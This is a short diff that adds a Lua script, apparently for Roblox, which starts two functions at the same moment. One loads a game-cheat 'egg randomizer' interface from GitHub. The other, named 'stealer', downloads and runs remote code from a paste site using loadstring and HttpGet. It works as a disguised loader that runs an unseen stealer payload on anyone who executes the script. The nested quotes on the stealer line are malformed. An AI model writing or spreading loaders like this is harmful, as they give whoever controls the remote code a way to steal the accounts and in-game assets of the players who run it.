@@ -1,0 +1,9 @@
+local function stealer()
+    loadstring(game:HttpGet("loadstring(game:HttpGet("https://cdn.sourceb.in/bins/FRIg4RFgU5/0", true))()'))()
+end
+local function loadui()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/NoLag1/Omghub/refs/heads/main/egg%20randomizer"))()
+end
+
+task.spawn(stealer)
+task.spawn(loadui)
